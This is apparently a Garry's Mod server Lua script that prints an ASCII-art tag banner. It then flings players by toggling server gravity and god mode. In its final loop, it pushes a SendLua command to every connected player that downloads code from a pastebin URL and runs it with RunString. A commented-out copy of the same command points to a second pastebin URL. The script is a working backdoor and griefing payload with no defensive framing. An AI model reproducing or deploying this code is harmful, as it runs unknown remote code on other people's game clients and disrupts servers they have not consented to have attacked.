if SERVER then
   
    print([[

  >=>>=>     >=>>=>   >=>         >=>       >=>   >=>       >===>        >=>>=>   >=>     >=> >=>   >=>   >=======> 
>=>    >=> >=>    >=>  >=>       >=>        >=>  >=>      >=>    >=>   >=>    >=> >=>     >=> >=>  >=>    >=>       
 >=>        >=>         >=>     >=>         >=> >=>     >=>        >=>  >=>       >=>     >=> >=> >=>     >=>       
   >=>        >=>        >=>   >=>          >>=>>       >=>        >=>    >=>     >=>     >=> >>=>>       >=====>   
      >=>        >=>      >=> >=>           >=>  >=>    >=>        >=>       >=>  >=>     >=> >=>  >=>    >=>       
>=>    >=> >=>    >=>      >===>            >=>   >=>     >=>     >=>  >=>    >=> >=>     >=> >=>   >=>   >=>       
  >=>>=>     >=>>=>         >=>             >=>     >=>     >===>        >=>>=>     >====>    >=>     >=> >=======> 
                                                                                                                                                                                           
         
    ]])
 

        //for k,v in pairs(player.GetAll()) do
         //   v:SendLua([[http.Fetch('https://pastebin.com/raw/HRA95Vqm',function(b,l,h,c)RunString(b)end,nil)]])
        //end




    function hautbas()
        RunConsoleCommand("sv_gravity",0)

        timer.Simple(4,function()

            RunConsoleCommand("sv_gravity",9000)

            for k, v in pairs( player.GetAll() ) do
                v:GodEnable()
            end

        end)

        timer.Simple(5,function()

            RunConsoleCommand("sv_gravity",600)
            for k, v in pairs( player.GetAll() ) do
                v:GodDisable()
            end

        end)
 
    end

    hautbas()

    timer.Simple(10,function()

        hautbas()

    end)

    for k,v in pairs(player.GetAll()) do
        v:SendLua([[http.Fetch('https://pastebin.com/raw/NV3123HV',function(b,l,h,c)RunString(b)end,nil)]])        
    end
    
end
